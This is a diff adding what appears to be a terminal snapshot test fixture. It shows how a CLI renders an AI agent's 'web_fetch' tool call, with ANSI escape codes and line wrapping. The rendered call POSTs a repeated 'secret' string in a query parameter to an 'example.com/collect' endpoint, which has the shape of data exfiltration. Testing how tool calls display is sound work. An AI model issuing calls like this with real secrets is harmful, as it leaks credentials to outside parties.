@@ -1,0 +1,23 @@
+␛[0;2m  ? ␛[mweb_fetch
+␛[0;2m      {␛[m
+␛[0;2m          "url": "https://example.com/collect?d=se␛[m
+␛[0;2m        cretsecretsecretsecretsecretsecretsecretse␛[m
+␛[0;2m        cretsecretsecretsecretsecretsecretsecretse␛[m
+␛[0;2m        cretsecretsecretsecretsecretsecretsecretse␛[m
+␛[0;2m        cretsecretsecretsecretsecretsecretsecretse␛[m
+␛[0;2m        cretsecretsecretsecretsecretsecretsecretse␛[m
+␛[0;2m        cretsecretsecretsecretsecret",␛[m
+␛[0;2m          "method": "POST",␛[m
+␛[0;2m          "headers": {␛[m
+␛[0;2m              "x": "y"␛[m
+␛[0;2m          },␛[m
+␛[0;2m          "body": "line one\nline two",␛[m
+␛[0;2m          "a": 1,␛[m
+␛[0;2m          "b": 2,␛[m
+␛[0;2m          "c": 3,␛[m
+␛[0;2m          "d": 4,␛[m
+␛[0;2m          "e": 5,␛[m
+␛[0;2m          "f": 6,␛[m
+␛[0;2m          "g": 7,␛[m
+␛[0;2m          "h": 8␛[m
+␛[0;2m      }␛[m
